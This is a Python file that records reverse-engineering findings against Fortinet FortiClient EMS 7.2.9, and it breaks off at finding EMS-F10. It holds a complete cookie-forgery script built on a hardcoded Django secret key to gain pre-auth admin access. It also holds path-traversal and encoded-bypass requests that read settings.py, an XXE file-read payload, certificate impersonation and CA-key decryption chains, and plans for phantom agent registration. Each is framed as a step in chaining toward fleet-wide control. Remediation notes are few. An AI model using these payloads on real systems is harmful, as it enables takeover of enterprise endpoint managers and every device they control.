"""
FortiClient EMS 7.2.9 -- Django application RE
Source: FortiClientEMS_7.2.9.0981.exe (WiX Burn bootstrapper)
Extraction: CAB at offset 0x7D600 -> MSI a11 (491MB) -> msiextract -> /tmp/ems_contents/
Django app: Program Files/Fortinet/FortiClientEMS/Fcm/
Python: 3.10 (pyc magic 0x6f0d = 3439), compiled 2025-04-08
Build path: C:\\GitLab-Runner\\builds\\temp\\FortiClientEMS\\webserver\\fcm\\
"""

# ---------------------------------------------------------
# Platform identity
# ---------------------------------------------------------
PLATFORM = {
    "product":    "Fortinet FortiClient EMS",
    "version":    "7.2.9.0981",
    "build_date": "2025-04-08",
    "installer":  "FortiClientEMS_7.2.9.0981.exe (WiX Burn bootstrapper)",
    "stack": {
        "web_server": "Apache24",
        "wsgi":       "Django 4.1 (apache_django_wsgi.conf)",
        "python":     "3.10 (CPython, Windows x64)",
        "db":         "SQL Server (pyodbc)",
        "cache":      "Redis",
    },
    "layout": {
        "installdir": "C:\\Program Files\\Fortinet\\FortiClientEMS",
        "fcm_dir":    "Fcm/",
        "settings":   "Fcm/fcm/settings.py",
        "urls":       "Fcm/fcm/urls.pyc",
        "views":      "Fcm/fcm/views.pyc",
        "auth":       "Fcm/fcm/auth/session_auth.pyc, jwt_auth.pyc, cert_chain_auth.pyc",
    },
    "analysis_notes": [
        "pyc files compiled for Python 3.10; decompyle3 v3.9.3 unsupported -- used strings(1) for constant extraction",
        "settings.py ships in plaintext (not compiled); full source readable from extracted MSI",
        "URL surface recovered from urls.pyc via strings extraction of regex patterns",
    ],
}


# ---------------------------------------------------------
# EMS-F1: Hardcoded Django SECRET_KEY + signed-cookie session forgery
# ---------------------------------------------------------
EMS_F1_SECRET_KEY_AUTH_BYPASS = {
    "id":        "EMS-F1",
    "title":     "Hardcoded Django SECRET_KEY enables pre-auth admin session forgery",
    "severity":  "CRITICAL",
    "cvss":      "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    "cvss_score": 9.8,
    "cwe":       "CWE-798 (Use of Hard-coded Credentials)",
    "status":    "CONFIRMED -- key present in shipped settings.py; installer rewrite unconfirmed",

    "evidence": {
        "file":          "Fcm/fcm/settings.py:26",
        "session_engine": "django.contrib.sessions.backends.signed_cookies",
        "secret_key":    "69v=0kt6&j$9q-t)yw8g15v&$x3wp(cg4$59$g+fwdot2ygy4r",
        "installer_comment": "# installer rewrites this lines to make it random per-machine",
        "rewrite_status": "No Python rewrite script found in extracted MSI; rewrite is likely a WiX C# custom action (DLL not recoverable from msiextract)",
        "additional_weaknesses": [
            "DEBUG = True",
            "SESSION_COOKIE_HTTPONLY = False -- cookie accessible via JS",
            "SESSION_COOKIE_SECURE = False -- cookie sent over plaintext HTTP",
            "CSRF_COOKIE_SECURE = False",
            "django.contrib.auth commented out of INSTALLED_APPS",
            "django.contrib.auth.middleware.AuthenticationMiddleware commented out of MIDDLEWARE",
        ],
    },

    "mechanism": (
        "Django signed_cookies session engine serializes the entire session dict, "
        "HMAC-signs it with SECRET_KEY (using HMAC-SHA256 via TimestampSigner), "
        "and stores the result client-side in the session cookie. No server-side "
        "session store is consulted. Any party knowing SECRET_KEY can call "
        "django.core.signing.dumps({'user_id': 1, 'user_role': 'admin', 'is_global': True, ...}, "
        "key=SECRET_KEY, salt='django.contrib.sessions.backends.signed_cookies') "
        "and produce a valid session cookie that SessionAuth.check_session accepts."
    ),

    "attack_chain": [
        "Step 1: Obtain SECRET_KEY from shipped installer (default: '69v=0kt6...')",
        "Step 2: Forge session dict with target user_id=1 (superadmin), user_role='admin', is_global=True",
        "Step 3: Sign using django.core.signing.dumps with extracted key",
        "Step 4: Send request to any authenticated /api/v1/ endpoint with forged sessionid cookie",
        "Step 5: SessionAuth.check_session validates HMAC -- passes",
        "Step 6: Full admin API access: device quarantine, policy push, config export, user management",
    ],

    "forge_primitive": """
from django.core.signing import dumps, TimestampSigner
import django.conf
django.conf.settings.configure(
    SECRET_KEY='69v=0kt6&j$9q-t)yw8g15v&$x3wp(cg4$59$g+fwdot2ygy4r',
    SESSION_ENGINE='django.contrib.sessions.backends.signed_cookies',
)
session_data = {
    '_auth_user_id': '1',
    '_auth_user_backend': 'django.contrib.auth.backends.ModelBackend',
    'user_id': 1,
    'user_role': 'admin',
    'is_global': True,
    'vdom': 'root',
    'allowed_vdoms': ['root'],
    'read_only': False,
}
cookie_val = dumps(
    session_data,
    key='69v=0kt6&j$9q-t)yw8g15v&$x3wp(cg4$59$g+fwdot2ygy4r',
    salt='django.contrib.sessions.backends.signed_cookies',
    compress=True,
)
# POST to /api/v1/endpoints/ with Cookie: sessionid=<cookie_val>
""",

    "confidence_notes": [
        "Default key confirmed in shipped settings.py",
        "Installer claims to randomize key at install time via custom action (WiX DLL)",
        "If installer rewrite succeeds: key is unique per install; attack requires key recovery",
        "Key recovery vectors: read settings.py from filesystem (requires local access), "
        "backup exposure, Django DEBUG=True error page leaks, LFI via EMS-F2",
        "Even with unique key: key stored in plaintext settings.py readable by any "
        "Windows user with access to the EMS install directory",
        "SESSION_COOKIE_HTTPONLY = False: XSS-to-session-theft enabled even without key",
    ],

    "remediation": [
        "Replace signed_cookies session engine with database-backed sessions (SESSION_ENGINE = 'django.contrib.sessions.backends.db')",
        "Ensure installer randomizes SECRET_KEY and verify the action runs",
        "Set SESSION_COOKIE_HTTPONLY = True",
        "Set SESSION_COOKIE_SECURE = True",
        "Restrict settings.py filesystem permissions to EMS service account only",
        "Disable DEBUG in production builds",
    ],
}


# ---------------------------------------------------------
# EMS-F2: Path traversal via /content/<path> endpoint
# ---------------------------------------------------------
EMS_F2_CONTENT_PATH_TRAVERSAL = {
    "id":       "EMS-F2",
    "title":    "Path traversal in content endpoint allows file read beyond CONTENT_DIRECTORY",
    "severity": "HIGH",
    "cvss":     "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
    "cwe":      "CWE-22 (Path Traversal)",
    "status":   "CANDIDATE -- regex confirmed; server-side join+sanitize not confirmed",

    "evidence": {
        "url_pattern":   r"^content/(?P<path>[^\\\s]+)/?$",
        "handler":       "views.py View.content()",
        "base_constant": "CONTENT_DIRECTORY (value not recovered; likely relative to INSTALLDIR or BASE_DIR)",
        "regex_analysis": (
            r"Regex [^\\\s]+ excludes only backslash and whitespace. "
            "Forward slashes, dots, and colons are permitted. "
            r"Pattern matches: '../../../Windows/System32/drivers/etc/hosts', "
            r"'../fcm/settings.py', '../../logs/debug_2025-04-08.log'"
        ),
    },

    "auth_status": (
        "CONFIRMED PRE-AUTH -- url group analysis from urls.pyc binary shows content/ "
        "pattern is in the same URL group as signin/ and favicon.ico (both pre-auth), "
        "BEFORE the authenticated API routes. content/ serves localization JS files "
        "needed on the login page before a session exists. No @prepare_api decorator."
    ),

    "content_directory": {
        "value":    "C:\\Program Files\\Fortinet\\FortiClientEMS\\Fcm\\fcm\\static\\js\\localization\\",
        "evidence": "localization_files_util.pyc strings: LOCALIZATION_FOLDER_PATH, static/js/localization/",
        "depth":    3,  # levels up from localization/ to fcm/ where settings.py lives
    },

    "traversal_notes": {
        "apache_normalization": (
            "EMS runs Apache24 as the web server (apache_django_wsgi.conf). "
            "Apache normalizes literal ../ in URL paths before WSGI dispatch, "
            "which may block direct path traversal. However: "
            "(1) URL-encoded variants (%2e%2e%2f) may pass if AllowEncodedSlashes is On; "
            "(2) Windows-specific path parsing may differ; "
            "(3) If Django receives the raw path without Apache normalization, traversal works directly."
        ),
        "bypass_candidates": [
            "GET /content/%2e%2e%2f%2e%2e%2f%2e%2e%2fsettings.py (encoded slashes)",
            "GET /content/..%2fsettings.py (mixed encoding)",
            "GET /content/%252e%252e%252fsettings.py (double encoding)",
        ],
    },

    "attack_chain": [
        "Step 1: GET /content/../../../settings.py (or encoded variant)",
        "Step 2: Read SECRET_KEY from response (live installed key if installer changed it, or default)",
        "Step 3: Forge admin session cookie using recovered key (EMS-F1 primitive)",
        "Step 4: Full admin API access with forged session",
    ],

    "samples": [
        "GET /content/../../../settings.py",
        "GET /content/%2e%2e%2f%2e%2e%2f%2e%2e%2fsettings.py",
        "GET /content/../../../logs/api_2025-04-08.log",
        "GET /content/../../../models/utils/sql_helper.pyc",
    ],

    "remediation": [
        "Resolve path with os.path.abspath() and assert result starts with CONTENT_DIRECTORY",
        "Use Django's serve() with document_root and ensure path is sanitized before join",
    ],
}


# ---------------------------------------------------------
# EMS-F3: XML import/convert endpoints -- XXE candidate
# ---------------------------------------------------------
EMS_F3_XML_XXE_CANDIDATE = {
    "id":       "EMS-F3",
    "title":    "XML import and convert endpoints are candidates for XXE injection",
    "severity": "HIGH",
    "cvss":     "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
    "cwe":      "CWE-611 (Improper Restriction of XML External Entity Reference)",
    "status":   "CANDIDATE -- endpoints confirmed in URL surface; parser config not confirmed",

    "endpoints": [
        "^convert/xml/?$",
        "^import/xml/?$",
        "^generate/xml/?$",
        "^download/xml/?$",
        "^get/xml/?$",
        "^default_xml/?$",
    ],

    "rationale": (
        "EMS stores endpoint policies and configurations as XML. "
        "Multiple endpoints accept XML uploads (import/xml) and perform XML conversion (convert/xml). "
        "Django does not configure XML parsers by default; if the controller uses Python's "
        "xml.etree.ElementTree or lxml with default settings, external entities are not disabled. "
        "Successful XXE on an import endpoint would allow reading arbitrary files "
        "from the EMS server filesystem via the SYSTEM entity mechanism."
    ),

    "probe": """
POST /api/v1/import/xml/ HTTP/1.1
Cookie: sessionid=<forged_via_EMS-F1>
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///C:/Program Files/Fortinet/FortiClientEMS/Fcm/fcm/settings.py" >]>
<config><item>&xxe;</item></config>
""",

    "remediation": [
        "Parse XML with defusedxml library or set ElementTree.XMLParser to disallow entities",
        "If using lxml: set resolve_entities=False and no_network=True in XMLParser",
    ],
}


# ---------------------------------------------------------
# EMS-F4: URL attack surface -- high-value endpoints
# ---------------------------------------------------------
EMS_F4_ATTACK_SURFACE = {
    "id":    "EMS-F4",
    "title": "FortiClient EMS 7.2.9 full URL attack surface",

    "extraction_method": "strings(1) on urls.pyc -- regex constants recovered without decompilation",

    "high_value_endpoints": {
        "session_forgery_targets": [
            "/api/v1/endpoints/ -- full endpoint management (quarantine, policy, deregister)",
            "/api/v1/users/ -- user management",
            "/api/v1/admins/ -- admin account management",
            "/api/v1/credentials/update/ -- credential update",
            "/api/v1/certificates/ -- certificate management",
            "/api/v1/server_certificates/ -- server cert management",
            "/api/v1/system/ -- system config",
            "/api/v1/settings/ -- application settings",
        ],
        "command_execution_candidates": [
            "/api/v1/groups/<group_id>/send_command/<command> -- pushes commands to enrolled FortiClient agents",
            "/api/v1/send_command/<command> -- global command push",
            "/api/v1/endpoints/<id>/reset_deployment/ -- confirmed in strings: 'Reset deployment of endpoint'",
        ],
        "file_operation_endpoints": [
            "/content/<path> -- EMS-F2 traversal target",
            "/api/v1/upload/ -- file upload",
            "/api/v1/upload_cert/ -- cert upload",
            "/api/v1/upload_pem -- PEM upload",
            "/api/v1/upload_pkcs12 -- PKCS12 upload",
            "/api/v1/download/ -- file download",
            "/api/v1/download_key/ -- key download",
            "/api/v1/export/ -- data export",
            "/api/v1/diagnostic_log/ -- server diagnostic log access",
            "/api/v1/support_package/ -- support package (likely includes config + logs + secrets)",
        ],
        "xml_endpoints": [
            "/api/v1/import/xml/ -- EMS-F3 XXE target",
            "/api/v1/convert/xml/ -- EMS-F3 XXE target",
            "/api/v1/generate/xml/",
            "/api/v1/download/xml/",
        ],
        "auth_bypass_candidates": [
            "/api/v1/jwt/signin/ -- JWT-based signin (separate auth path from session)",
            "/api/v1/auth_fos/ -- FortiOS auth integration",
            "/api/v1/fabric-authorization/ -- fabric device auth (separate path)",
            "/api/v1/saml/ -- SAML auth flow",
            "/api/v1/cloud/signin -- cloud signin flow",
        ],
        "pre_auth_exposed": [
            "/signin/ -- login page",
            "/favicon.ico",
            "/api/v1/check_session -- session validity check (unauthenticated probe)",
            "/api/v1/init_consts -- application constants (may leak version/config info)",
            "/api/v1/acme/ -- ACME certificate management (may be pre-auth)",
        ],
    },

    "total_url_patterns_recovered": "~200+ unique regex patterns",

    "send_command_analysis": {
        "url": r"^groups/(?P<group_id>\d+)/send_command/(?P<command>",
        "note": (
            "command parameter is URL-captured; in endpoint_controller.pyc strings, "
            "ENDPOINT_COMMANDS is referenced alongside 'quarantined', 'vulnscan' constants -- "
            "commands appear to be validated against an allowlist before dispatch to FortiClient agents. "
            "Command injection on the EMS server itself was NOT confirmed; "
            "these commands are pushed to enrolled endpoints via the OFTP/EMS protocol, not executed locally."
        ),
        "lateral_risk": (
            "Authenticated admin can push quarantine/vulnscan/remediation commands to all enrolled "
            "FortiClient endpoints. Combined with EMS-F1, an unauthenticated attacker gains "
            "fleet-wide endpoint command execution capability."
        ),
    },
}


# ---------------------------------------------------------
# EMS-F5: Embedded shared Fortinet root CA in FcmDaemon.exe
# ---------------------------------------------------------
EMS_F5_EMBEDDED_CA = {
    "id":       "EMS-F5",
    "title":    "Shared Fortinet root CA embedded in FcmDaemon.exe with encrypted private key",
    "severity": "HIGH",
    "cvss":     "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N",
    "cwe":      "CWE-321 (Use of Hard-coded Cryptographic Key)",
    "status":   "CONFIRMED -- CA cert embedded; passphrase at runtime (not hardcoded); impact depends on passphrase recovery",

    "certificate": {
        "issuer":    "C=US, ST=California, L=Sunnyvale, O=Fortinet, OU=Certificate Authority, CN=support",
        "subject":   "Same (self-signed)",
        "email":     "support@fortinet.com",
        "not_before": "2015-07-16 22:34:39 UTC",
        "not_after":  "2038-01-19 22:34:39 UTC",
        "key_usage":  "CA:TRUE (can sign any certificate)",
        "key_size":   "RSA 2048-bit",
    },

    "private_key": {
        "format":     "PEM PKCS#1 RSA private key, AES-256-CBC encrypted",
        "iv":         "F4DD69DDD1982F6FDD0D75097603C628",
        "location":   "FcmDaemon.exe binary (embedded as string constant)",
        "passphrase": "Runtime CLI argument --keypass; NOT hardcoded in binary or config files",
    },

    "impact": (
        "Fortinet CA cert is shared across ALL EMS installations -- it is embedded in the installer binary. "
        "Apache VirtualHost references SSLCACertificateFile 'fortinet_ca_root_all.crt' for client cert validation. "
        "If private key passphrase is recovered (registry, process memory, installer custom action analysis), "
        "attacker can sign arbitrary client certs trusted by ALL EMS instances. "
        "Combined with EMS-F6 (optional_no_ca), cert forgery is not needed for the web API -- "
        "but matters for OFTP/gRPC agent channel (FcmDaemon port 8013)."
    ),

    "attack_chain": [
        "Step 1: Recover --keypass from EMS service registry or installer custom action DLL",
        "Step 2: Decrypt embedded RSA private key using openssl pkey -in key.pem -passin pass:<keypass>",
        "Step 3: Sign client cert with CN=<FortiGate serial number> or CN=<admin username>",
        "Step 4: Use signed cert to impersonate FortiGate device in fabric auth or EMS agent protocol",
    ],
}


# ---------------------------------------------------------
# EMS-F6: Apache SSLVerifyClient optional_no_ca -- arbitrary client cert accepted
# ---------------------------------------------------------
EMS_F6_CLIENT_CERT_NO_CA_VERIFY = {
    "id":       "EMS-F6",
    "title":    "Apache SSLVerifyClient optional_no_ca allows arbitrary client certs to bypass identity verification",
    "severity": "CRITICAL",
    "cvss":     "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
    "cwe":      "CWE-295 (Improper Certificate Validation)",
    "status":   "CONFIRMED -- config explicitly sets optional_no_ca",

    "evidence": {
        "file":    "Apache24/conf/apache_django_wsgi.conf (VirtualHost *:[SERVERSSLPORT])",
        "config":  "SSLVerifyClient optional_no_ca",
        "header_forwarding": "RequestHeader set SSL_CLIENT_S_DN_CN \"%{SSL_CLIENT_S_DN_CN}s\"",
        "explanation": (
            "optional_no_ca means: accept client certificate if presented, "
            "but DO NOT verify it against any CA. Any self-signed certificate is accepted. "
            "The client cert's CN is extracted and forwarded to Django as SSL_CLIENT_S_DN_CN request header."
        ),
    },

    "attack_chain": [
        "Step 1: Generate self-signed certificate with any desired CN (e.g., 'admin', a FortiGate serial number)",
        "Step 2: Connect to EMS HTTPS (port 8443 or SERVERSSLPORT) with the self-signed cert",
        "Step 3: Apache accepts the cert (no CA check) and sets SSL_CLIENT_S_DN_CN = <your CN>",
        "Step 4: Django cert_chain_auth.pyc receives forged CN as trusted identity",
        "Step 5: Impact depends on how Django uses SSL_CLIENT_S_DN_CN for access control",
    ],

    "affected_auth_paths": [
        "cert_chain_auth.pyc -- device identity from cert CN for fabric authorization",
        "fabric_device_auth_controller.pyc -- FortiGate fabric device endpoints",
        "fct_saml_auth_controller.pyc -- SAML with cert-chain identity",
        "^fabric-authorization/ -- fabric auth endpoint",
        "^fabric_device_auth/ -- device auth endpoint",
    ],

    "confirmed_impact": (
        "cert_chain_auth.pyc analysis confirms: "
        "Django checks SSL_CLIENT_VERIFY=SUCCESS (set by Apache even with optional_no_ca), "
        "then calls get_by_cn() to look up the cert CN in the EMS database. "
        "If CN matches a registered device: grants that device's role/access. "
        "ATTACK: Present self-signed cert with CN = FortiGate serial number (visible in "
        "management traffic, firmware, device UI) to impersonate that fabric device. "
        "NOT arbitrary admin -- requires knowing a registered device CN. "
        "Django may also call _check_certificate_chain_is_valid() -- if this calls OpenSSL "
        "for chain verification INDEPENDENTLY of Apache, the bypass is mitigated. "
        "Severity downgraded to HIGH pending confirmation of _check_certificate_chain_is_valid() scope."
    ),

    "apache_config_other_findings": {
        "script_src_unsafe_eval": (
            "Content-Security-Policy allows 'unsafe-eval' and 'unsafe-inline' in script-src -- "
            "XSS mitigation weakened; JS eval() allowed."
        ),
        "proxy_to_ztnaworker": (
            "SSL_CLIENT_VERIFY SUCCESS routes /api/v1/report/fct/tags -> localhost:9990 -- "
            "with forged cert (EMS-F6), attacker routes to ztnaworker directly."
        ),
    },
}


# ---------------------------------------------------------
# EMS-F7: GoEMS/FcmDaemon architecture findings
# ---------------------------------------------------------
EMS_F7_DAEMON_ARCHITECTURE = {
    "id":    "EMS-F7",
    "title": "GoEMS daemon architecture -- ECSO gRPC port 8013, Redis no-auth",
    "severity": "MEDIUM",

    "daemon_stack": {
        "goEMS.conf": "Go-based EMS daemon handling agent protocol (gRPC)",
        "ecsocksrvworker": {
            "host": "0.0.0.0",
            "port": 8013,
            "tls":  "yes (TLS_ECDHE_ECDSA ciphers)",
            "protocols": ["X-FCCK-PROBE", "X-FCCK-TAG", "X-FCCK-REGISTER", "X-FCCK-KA"],
        },
        "legacy_protocol": {
            "host": "127.0.0.1",
            "port": 65431,
            "services": ["X-FCCK-PROBE", "X-FCCK-REGISTER", "X-FCCK-KA", "X-FCCK-TAG", "UPLOAD"],
        },
        "workers": {
            "kaworker":   {"port": 9991, "grpc": True},
            "probeworker": {"port": 9992},
            "tagworker":  {"port": 9993},
            "regworker":  {"port": 9994, "grpc": True},
            "ztnaworker": {"port": 9990},
            "das":        {"port": 65432},
        },
    },

    "redis_no_auth": {
        "host":     "127.0.0.1",
        "port":     6379,
        "password": "",
        "evidence": "connector.conf [redis] Password = (empty)",
        "impact":   (
            "Redis accessible without authentication from any process on EMS server. "
            "Post-initial-access: read/write session data, push malicious tasks, "
            "inject data into EMS workflow queues."
        ),
    },

    "pre_auth_surface": (
        "Port 8013 is the pre-authentication FortiClient agent registration endpoint. "
        "X-FCCK-REGISTER service accepts agent connections without prior authentication. "
        "Analysis of regworker.exe (Go binary, 14 sections) is needed to identify "
        "registration protocol parsing vulnerabilities."
    ),
}


# ---------------------------------------------------------
# EMS-F8: Go gRPC pre-auth protocol schema -- full protobuf surface recovered
# ---------------------------------------------------------
EMS_F8_GRPC_PROTOCOL_SCHEMA = {
    "id":       "EMS-F8",
    "title":    "Full gRPC pre-auth protocol schema recovered from regworker/ecsocksrv pclntab",
    "severity": "INFORMATIONAL (schema recovery enabling EMS-F9/F10 attacks)",
    "status":   "CONFIRMED -- pclntab strings extraction from 33MB Go PE32+ binaries",

    "binaries": {
        "ecsocksrv.exe": {
            "role": "outer socket proxy -- listens 0.0.0.0:8013 TLS, dispatches to worker processes",
            "size": "33MB PE32+ Go binary",
            "module_path": "fortinet.com/ems/cmd/ecsocksrv",
            "services": [
                "ProbeService.Probe",
                "RegisterService.Register",
                "KeepAliveService.KeepAlive",
                "TagService (TagRequest/TagResponse)",
                "ForensicsService (multiple methods)",
            ],
        },
        "regworker.exe": {
            "role": "registration handler -- localhost:9994, gRPC, forwards from ecsocksrv",
            "size": "33MB PE32+ Go binary",
            "module_path": "fortinet.com/ems/cmd/regworker",
            "shared_package": "fortinet.com/ems/server (socket_server.go, grpc_server.go, daemon_server.go)",
        },
    },

    "proto_messages": {
        "Header": {
            "fctUID":          1,
            "ip":              2,
            "mac":             3,
            "fctOnNet":        4,
            "onNet":           5,
            "ecState":         6,
            "fgtSN":           7,
            "vdom":            8,
            "caps":            9,
            "avRunning":       10,
            "avScanInfo":      11,
            "dbID":            12,
            "dbSCHID":         13,
            "deployVer":       14,
            "schTime":         15,
            "error":           16,
            "state":           17,
            "ecQuarantined":   18,
            "ecUnquarantined": 19,
            "vbltRunning":     20,
            "vbltCompleted":   21,
            "vulnIDs":         22,
            "rules":           23,
            "tags":            24,
            "desc":            25,
            "uptime":          26,
            "tstat":           27,
            "alerts":          28,
            "alerts15":        29,
            "token":           30,
            "msgsStatus":      31,
            "protoVer":        32,
        },
        "RegisterRequest": {
            "header":  1,
            "sysInfo": 2,
            "conn":    3,
        },
        "RegisterResponse": {
            "reg":             1,
            "avSig":           2,
            "licFeats":        3,
            "licED":           4,
            "newGuid":         5,
            "softCrc":         6,
            "emsOnNet":        7,
            "zFgtIp":          8,
            "cs":              9,
            "zHVR":            10,
            "hvCs":            11,
            "offConf":         12,
            "offSum":          13,
            "onNet":           14,
            "onNetCs":         15,
            "zConf":           16,
            "csum":            17,
            "zCerts":          18,
            "csCerts":         19,
            "runSrvCmd":       20,
            "wfPageURL":       21,
            "wfChksm":         22,
            "token":           23,
            "authType":        25,   # 0=local 1=LDAP 2=SAML 3=Azure -- tells client which auth method
            "authLDAP":        26,   # LDAP server config pushed to endpoint
            "authSAML":        27,   # SAML config pushed to endpoint
            "authPRD":         28,
            "errMsg":          29,
            "serial":          30,
            "tenantID":        31,
            "authAzure":       32,
            "azureClientID":   33,
            "protoVersion":    34,
            "perCon":          35,
            "endpointVersion": 36,
            "authSAMLURL":     37,   # SAML endpoint URL pushed to endpoint -- see EMS-F14
        },
        "KeepAliveRequest": {
            "header":   1,
            "sysInfo":  2,
            "conn":     3,
            "usrName":  4,
            "usrEmail": 5,
            "service":  6,
            "phone":    7,
            "certReq":  8,
            "usrPic":   9,
            "usrPict":  10,
        },
        "KeepAliveResponse": {
            "cont":            1,
            "renewReg":        2,
            "emsSN":           3,
            "upldPrt":         4,
            "kaInterval":      5,
            "licenseVer":      6,
            "licFeats":        7,
            "licED":           8,
            "snapTime":        9,
            "quar":            10,   # quarantine command
            "avtr":            11,
            "avSig":           12,
            "emsOnNet":        13,
            "qCode":           14,
            "qReason":         15,
            "qMsg":            16,
            "runSrvCmd":       17,   # CRITICAL: run service command on endpoint -- see EMS-F15
            "aval":            18,
            "avalUrl":         19,   # AV update URL -- rogue EMS can redirect to malicious URL
            "avalEng":         20,
            "avalEngCRC":      21,
            "avalEng64CRC":    22,
            "avalEngMacCRC":   23,
            "avalEngUrl":      24,
            "avalEng64Url":    25,
            "avalEngMacUrl":   26,
            "mace":            27,
            "maca":            28,
            "upgradePath":     29,   # upgrade binary URL -- rogue EMS arbitrary binary delivery
            "regPwd":          40,   # CRITICAL: registration password pushed to endpoint -- see EMS-F13
            "cloud":           41,
            "wfPageURL":       42,
            "wfChksm":         43,
            "vulnPatch":       44,
            "error":           45,
            "zFgtIp":          46,
            "cs":              47,
            "zHVR":            48,
            "hvCs":            49,
            "offConf":         50,
            "offSum":          51,
            "onNet":           52,
            "onNetCs":         53,
            "zConf":           54,
            "csum":            55,
            "zCerts":          56,
            "csCerts":         57,
            "cert":            58,   # EMS issues X.509 client cert to endpoint
            "caCert":          59,   # EMS CA cert pushed to endpoint
            "certRevoke":      60,
            "tags":            61,
            "authType":        63,
            "authLDAP":        64,
            "authSAML":        65,
            "authPRD":         66,
            "errMsg":          67,
            "serial":          68,
            "authAzure":       69,
            "azureClientID":   70,
            "messages":        71,
            "tenantID":        72,
            "fsrUpldUrl":      73,
            "fsrUpldToken":    74,
            "protoVersion":    75,
            "perCon":          76,
            "endpointVersion": 77,
            "authSAMLURL":     78,
        },
        "ProbeRequest":  {"header": 1, "probeFeatureBitmap": 2},
        "ProbeResponse": {
            "fgt":             1,
            "featureBitmap":   2,
            "emsVer":          3,
            "protoVersion":    4,
            "perCon":          5,
            "endpointVersion": 6,
        },
        "SysInfo": {
            "regKey":                 1,
            "fctOS":                  2,
            "fctVer":                 3,
            "avSigVer":               4,
            "avEngVer":               5,
            "appSigVer":              6,
            "appEngVer":              7,
            "vulSigVer":              8,
            "vulEngVer":              9,
            "avALSigVer":             10,
            "avALEngVer":             11,
            "enabledFeatureBitMap":   12,
            "installedFeatureBitMap": 13,
            "hiddenFeatureBitMap":    14,
            "hostname":               15,
            "domain":                 16,
            "osVer":                  17,
            "user":                   18,
            "userSID":                19,
            "comMan":                 20,
            "comSN":                  21,
            "cpu":                    22,
            "mem":                    23,
            "hdd":                    24,
            "fctUnreg":               25,
            "epChksum":               26,
            "dhcpServer":             27,
            "pcDomain":               28,
            "utc":                    29,
            "installUID":             30,
            "fctSN":                  31,
            "epFgtChksum":            32,
            "epCertsChksum":          33,
            "epRuleChksum":           34,
            "epOnnetChksum":          35,
            "epOffnetChksum":         36,
            "fctAutoUnreg":           37,
            "avProtected":            38,
            "groupTag":               39,
            "wfFilesChksum":          40,
            "avProduct":              41,
            "diskEnc":                42,
            "nwIfs":                  43,
            "peerIP":                 44,
            "adGuid":                 45,
            "invCode":                46,   # invitation code for restricted registration
            "token":                  47,
            "workgroup":              48,
            "regStatus":              50,
            "avwlSigVer":             51,
            "avwlEngVer":             52,
            "sslVPN":                 53,
            "fctDate":                54,
            "epLogoff":               55,
            "adGroups":               56,
            "dgwMacList":             57,
            "dgwIPList":              58,
            "ipList":                 59,
            "macList":                60,
            "dgwMac":                 61,
            "gwMacList":              62,
            "tempConfig":             63,
            "comModel":               64,
            "authUser":               65,   # PLAINTEXT AD/LDAP username -- see EMS-F10
            "authPassword":           66,   # PLAINTEXT AD/LDAP password -- see EMS-F10
            "reAuth":                 67,
            "enabledApps":            68,
            "installedApps":          69,
            "authAzureToken":         70,
            "azureDeviceID":          72,
            "azureTenantID":          73,
            "mdm":                    74,
            "rsEngVer":               76,
            "fsrStatus":              77,
            "fsrDownlUrl":            78,
            "mdmDeviceId":            79,
            "mobileSecurityBitMap":   80,
        },
        "TagRequest": {
            "uid":   1,
            "ip":    2,
            "mac":   3,
            "vdom":  4,
            "rules": 5,
            "nwifs": 6,
            "conn":  7,
            "caps":  8,
            "token": 9,
        },
        "TagResponse": {
            "tags":            1,
            "err":             2,
            "protoVersion":    3,
            "perCon":          4,
            "endpointVersion": 5,
        },
        "ConnectorInfo": {
            "apiKey":      1,   # fabric connector API key on internal gRPC bus
            "connId":      2,
            "instanceId":  3,
            "type":        4,
            "vdom":        5,
            "version":     6,
        },
    },

    "proto_files": [
        "fortinet.com/ems/internal/pb/ad_events.pb.go",
        "fortinet.com/ems/internal/pb/ad_evt_srv_api.pb.go",
        "fortinet.com/ems/internal/pb/ad_ldap.pb.go",
    ],

    "key_strings": {
        "startUnprotectedListener": (
            "fortinet.com/ems/server.(*SocketServer).startUnprotectedListener exists -- "
            "non-TLS listener path in socket_server.go; conditions unknown"
        ),
        "logRegRequest":  "ecsocksrv logs every registration request (format/fields unknown)",
        "doNotReregister": "global flag to block re-registration -- set after first registration",
    },
}


# ---------------------------------------------------------
# EMS-F9: Open registration -- inv_only_reg_enforcement_type default allows any device
# ---------------------------------------------------------
EMS_F9_OPEN_REGISTRATION = {
    "id":       "EMS-F9",
    "title":    "Pre-auth FortiClient registration accepts unauthenticated device with no pre-shared credential",
    "severity": "HIGH",
    "cvss":     "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:N",
    "cvss_score": 8.2,
    "cwe":      "CWE-306 (Missing Authentication for Critical Function)",
    "status":   "CANDIDATE -- inv_only_reg_enforcement_type found; default value unconfirmed",

    "evidence": {
        "sql_query":  "SELECT inv_only_reg_enforcement_type FROM system_settings",
        "invitation_schema": (
            "invitations table: invitation_id, is_bulk, used_count, disabled_state_id, "
            "authentication_type -- controlled by inv_only_reg_enforcement_type DB flag"
        ),
        "invitation_v2": "config.invitation.v2 section in goEMS.conf; Enabled = False (default)",
        "proto_fields": [
            "SysInfo.GetInvCode  -- invitation code field (may be optional)",
            "SysInfo.GetRegKey   -- registration key (may be empty for open registration)",
        ],
        "error_string": "fct user not found for tags message -- device lookup fails if not registered",
    },

    "attack": (
        "RegisterRequest with fabricated SysInfo (any FctUID UUID, any Hostname/IP) sent to port 8013. "
        "If inv_only_reg_enforcement_type = 0 (disabled), server registers device and returns Token + NewGuid. "
        "Attacker receives valid Token for subsequent KeepAlive/Tag/Forensics requests. "
        "Registers as phantom endpoint in EMS device DB -- potential for policy injection and data exfiltration."
    ),

    "confirmation_needed": [
        "Verify default value of inv_only_reg_enforcement_type (0=open or 1=invite-only)",
        "Test registration with empty InvCode -- does server accept or reject",
        "Check if License limits restrict phantom device registration",
    ],
}


# ---------------------------------------------------------
# EMS-F10: SysInfo.AuthPassword -- plaintext credentials on gRPC wire
